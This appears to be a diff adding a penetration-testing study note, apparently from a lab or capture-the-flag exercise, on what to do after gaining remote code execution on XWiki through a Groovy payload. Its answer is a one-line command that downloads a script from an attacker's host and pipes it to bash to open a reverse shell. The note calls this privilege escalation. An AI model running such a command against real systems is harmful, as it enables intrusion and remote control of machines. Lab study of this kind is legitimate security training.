@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you escalate privileges after gaining access to XWiki?
+
+CONTEXT:
+You have executed the Groovy payload and achieved remote code execution.
+
+METHOD / ANSWER:
+Command: `curl http://10.10.14.6/rev | bash`
+Explanation: This attempts to execute a reverse shell command to connect back to your machine.
